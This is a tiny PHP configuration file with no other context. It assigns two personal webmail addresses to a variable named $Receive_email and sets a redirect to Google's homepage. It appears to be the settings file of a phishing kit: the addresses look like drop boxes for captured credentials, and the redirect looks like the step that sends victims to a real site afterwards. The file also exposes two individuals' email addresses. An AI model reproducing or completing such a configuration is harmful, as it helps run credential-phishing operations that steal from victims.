<?php 
$Receive_email="reltsbxxs433@gmail.com, mary.lin172@hotmail.com";
$redirect="https://www.google.com/";
?>